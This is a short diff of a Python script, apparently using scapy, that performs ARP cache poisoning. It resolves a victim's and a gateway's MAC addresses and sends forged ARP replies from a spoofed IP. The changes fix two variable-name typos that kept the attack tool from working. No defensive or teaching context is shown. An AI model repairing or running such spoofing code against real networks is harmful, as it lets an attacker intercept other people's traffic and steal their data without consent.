@@ -7,7 +7,7 @@ def getMAC(ip):
     for s, r in ans:
         return r.sprintf('Ether.src%')
 
-def poisonARP(srcip, targtip, targetmac):
+def poisonARP(srcip, targetip, targetmac):
     arp=ARP(op=2, psrc=srcip,pdst=targetip,hwdst=targetmac)
     send(arp)
     
@@ -24,7 +24,7 @@ def main():
     victimmac = getMAC(victimip)
     gatewaymac = getMAC(gatewayip)
 
-    if(victimac == None or gatewaymac == None):
+    if(victimmac == None or gatewaymac == None):
         print("Sry i cant find MacAdress :(")
         return
 
